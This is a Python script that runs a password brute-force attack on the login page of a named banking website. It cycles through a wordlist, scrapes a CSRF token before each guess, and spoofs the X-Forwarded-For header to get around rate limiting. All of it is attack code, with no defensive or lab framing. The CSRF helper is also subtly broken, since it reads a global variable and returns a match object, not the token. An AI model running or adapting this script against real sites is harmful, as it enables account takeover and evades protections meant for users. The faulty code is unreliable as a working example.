import requests
import random
import re

BASE_URL = "https://www.nmlbanking.com"
LOGIN_URL = f"{BASE_URL}/login"
USERNAME = "alice"  # Replace with known valid user
# Example wordlist; replace with your real list for brute force
PASSWORD_LIST = ["password123", "alice", "guest", "admin", "test123"]

def extract_csrf(html):
    import re
    pattern = r'<input[^>]*name=["\']csrf["\'][^>]*value=["\']?([A-Fa-f0-9]+)["\']?'
    match = re.search(pattern, resp.text)
    
    return match

session = requests.Session()

for idx, password in enumerate(PASSWORD_LIST):
    print(f"\n[*] Attempt {idx+1}: Trying password '{password}'")

    # GET login page for fresh CSRF token
    resp = session.get(LOGIN_URL)
    csrf_token = extract_csrf(resp.text)
    if not csrf_token:
        print("[!] Failed to extract CSRF token; skipping attempt.")
        continue

    # Rotate X-Forwarded-For to avoid rate limits
    fake_ip = f"192.168.1.{random.randint(2, 254)}"
    headers = {"X-Forwarded-For": fake_ip}

    login_data = {
        "csrf": csrf_token,
        "username": USERNAME,
        "password": password
    }
    post_resp = session.post(LOGIN_URL, data=login_data, headers=headers)
    print(f"[!] X-Forwarded-For: {fake_ip}")
    print(f"[+] Status code: {post_resp.status_code}")

    # Check result using response content
    if "Passwords Did Not Match" in post_resp.text:
        print(f"[-] Incorrect password: {password}")
    elif "User Does not Exist" in post_resp.text:
        print(f"[!] Invalid username: {USERNAME}")
        break
    elif "home" in post_resp.url or post_resp.history:
        print(f"[+] SUCCESS: Correct password found: {password}")
        break
    else:
        print(f"[?] Unexpected response - manual check advised.")
    print(post_resp.text[:200])  # Print first part of response for debugging

print("[*] Brute force completed.")
